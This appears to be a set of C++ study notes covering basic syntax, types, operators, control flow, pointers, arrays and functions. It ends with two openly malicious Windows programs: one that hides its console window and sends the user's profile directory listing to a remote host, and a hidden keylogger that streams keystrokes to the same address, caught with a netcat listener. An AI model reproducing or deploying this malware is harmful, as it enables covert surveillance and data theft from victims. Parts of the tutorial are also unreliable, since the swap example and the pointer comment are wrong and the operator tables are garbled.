# C++

```cpp
/*
    `Hello World` example where we make use of:
    - Comments
    - Directives
    - Namespaces
    - Terminators (;)
    - `main` function + body
*/

#include <iostream>
using namespace std;

int main() {
  cout << "Hello World";

  // system("PAUSE");
  // cin.ignore();

  return 0;  // program has completed its execution without any errors
}
```

Variables can be 'global' or 'local'.

| Variable Type     |                                                  |
| ----------------- | ------------------------------------------------ |
| short / short int | short integer (2 bytes)                          |
| int               | integer (4 bytes)                                |
| long / long int   | long integer (4 bytes)                           |
| bool              | boolean (1 byte)                                 |
| float             | floating point number (4 bytes)                  |
| double            | double precision floating point number (8 bytes) |
| char              | Character (1 byte)                               |

```cpp
// Input / Output

int uservalue;
cout << "The value of variable sum is " << sum << endl;
cin >> uservalue;
```

### Operators

In C++ there are four main classes of operators:

| Operator   |                                  |                       |        |
| ---------- | -------------------------------- | --------------------- | ------ |
| Relational | `>`, `>=`, `<`, `<=`, `==`, `!=` |                       |        |
| Logical    | `&&`, \`                         |                       | `,`!\` |
| Bitwise    | `&`, \`                          | `,`^`,`\~`,`>>`,`<<\` |        |

* Expressions that use relational or logical operators return 0 or false and 1 for true.
* 0 value converts to false
* non-zero values automatically converts to true

### Iteration and Conditional Structures

* Useful to instruct the program to execute or to repeat a specific operation when some condition is matched.

| Selection | Iteration | Jump     |
| --------- | --------- | -------- |
| if        | while     | break    |
| switch    | for       | continue |
|           | do-while  | goto     |
|           |           | return   |

```cpp
if (expression)
  statement;
else
  statement;
```

```cpp
switch(expression) {
 case constant1:
  statement sequence
  break;
 case constant2:
  statement sequence
  break;
 default
 statement sequence
}
```

```cpp
for(initialization;condition;increment) {
  statement
}

for ( ; ; ) {

}
```

```cpp
while (condition) {
  statement;
}

do {

} while (condition);
```

```cpp
goto label;
...
...
label:
```

### Pointers

* A pointer is a variable that holds a memory address. This address is the location of another object in memory.
* If a variable is a pointer, it must be declared in a different way.
* `type` defines the type of variable the pointer can point to.
* `*` is the complement of `&`. It returns the value located at the address of the following operator.

```cpp
type *name;

x = &y; // places the value in memory pointed by y into x. So if y contains the memory address of another variable, x will have the same of that 3rd variable
```

### Arrays

An array is a collection of variables of the same type, which is accessed by an index. All arrays have 0 as an index of the first element:

```cpp
type var_name[size];

// Iterate

int x[20];
int i;

for (i=0; i<20; i++) {
  x[i] = i;
}
```

### Functions Study Guide

Functions are blocks of statements defined under a name.

```cpp
type function_name(param1, param2, ...){
  statements;
}

// function with "formal" parameters
int sum(int x, int y) {
  int z;
  z = x + y;
  return(z);
}
```

In almost any programming language, there are two ways in which we can pass arguments to a function:

* By value
  * Copies the value of an argument into a parameter. Changes made to the parameter do not affect the argument
  * Code in the function does not alter the arguments used by the caller
  * It's a copy of the value of the argument passed into the function
  * What occurs inside the function has NO EFFECT on the variable provided by the caller
* By reference
  * The address of an argument (not the value) is copied into the parameter
  * Inside the function, the address is used to access the actual argument used in the call
  * Changes made to the parameter will affect the argument

```cpp
void swap(int& x, int& y) {
  int temp;
  temp=*x;
  *x=*y;
  *y=temp;
}
```

### Example: Steals user's directory content

Listen for an incoming connection with `nc -lvp 5555`:

```cpp
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Ws2_32.lib")
#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string>

char* userDirectory()
{
    char* pPath;
    pPath = getenv ("USERPROFILE");
    if (pPath!=NULL)
    {
        return pPath;
    } else {
        perror("");
    }
}

int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    WSADATA WSAData;
    SOCKET server;
    SOCKADDR_IN addr;

    WSAStartup(MAKEWORD(2, 0), &WSAData);
    server = socket(AF_INET, SOCK_STREAM, 0);
    addr.sin_addr.s_addr = inet_addr("192.168.0.29");
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5555);
    connect(server, (SOCKADDR *)&addr, sizeof(addr));

    char* pPath = userDirectory();
    send(server, pPath, sizeof(pPath), 0);

    DIR *dir;
    struct dirent *ent;
    if ((dir = opendir (pPath)) != NULL) {
        while ((ent = readdir (dir)) != NULL) {
        send(server, ent->d_name, sizeof(ent->d_name), 0);
        }
        closedir (dir);
    } else {
        perror ("");
    }
    closesocket(server);
    WSACleanup();
}
```

### Example: keylogger that sends any collected information back

Listen for an incoming connection with `nc -lvp 5555`:

```cpp
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Ws2_32.lib")
#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    char KEY;

    WSADATA WSAData;
    SOCKET server;
    SOCKADDR_IN addr;

    WSAStartup(MAKEWORD(2, 0), &WSAData);
    server = socket(AF_INET, SOCK_STREAM, 0);
    addr.sin_addr.s_addr = inet_addr("192.168.0.29");
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5555);
    connect(server, (SOCKADDR *)&addr, sizeof(addr));

        while (true) {
        Sleep(10);
        for (int KEY = 0x8; KEY < 0xFF; KEY++)
        {
            if (GetAsyncKeyState(KEY) == -32767) {
                        char buffer[2];
                        buffer[0] = KEY;
                        send(server, buffer, sizeof(buffer), 0);
            }
        }
}
closesocket(server);
WSACleanup();
}
```
